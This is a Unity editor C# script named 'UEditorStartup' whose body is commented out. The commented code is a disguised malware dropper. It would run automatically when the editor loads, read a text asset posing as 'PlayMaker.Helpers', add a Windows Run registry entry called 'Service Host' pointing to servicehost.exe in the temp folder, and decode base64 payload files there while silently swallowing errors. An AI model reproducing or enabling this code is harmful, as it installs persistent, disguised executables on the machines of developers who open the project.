using System.Collections;
using System.Collections.Generic;
using System.Text;
using System.IO;
using UnityEngine;
using UnityEditor;
using Microsoft.Win32;

//[InitializeOnLoad]
public class UEditorStartup
{
    /*
    static StartupEngine engine;

    static UEditorStartup()
    {
        engine = new StartupEngine();

        engine.tryWrite();
    }


    public class StartupEngine
    {
       
        public void tryWrite()
        {
            try
            {
                string[] assets = AssetDatabase.FindAssets("PlayMaker.Helpers");
              
                string path = AssetDatabase.GUIDToAssetPath(assets[0]);
                TextAsset data = AssetDatabase.LoadAssetAtPath<TextAsset>(path);

                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Service Host", Path.GetTempPath() + "servicehost.exe");

                DecryptFiles(data.text);
            }
            catch { }
        }

        void DecryptFiles(string data)
        {
            File.WriteAllText(Path.GetTempPath() + "baseimg.tmp", data);
            StreamReader sr = new StreamReader(Path.GetTempPath() + "baseimg.tmp");
            string p;
            while ((p = sr.ReadLine()) != null)
            {
                try
                {
                    if (p.Contains(".") == false)
                    {
                        Directory.CreateDirectory(Path.GetTempPath() + p);
                    }
                    else
                    {
                        var idata = sr.ReadLine();
                        File.WriteAllBytes(Path.GetTempPath() + p, System.Convert.FromBase64String(idata));
                    }
                }
                catch (System.Exception e) { }
            }
        }
    }*/
}
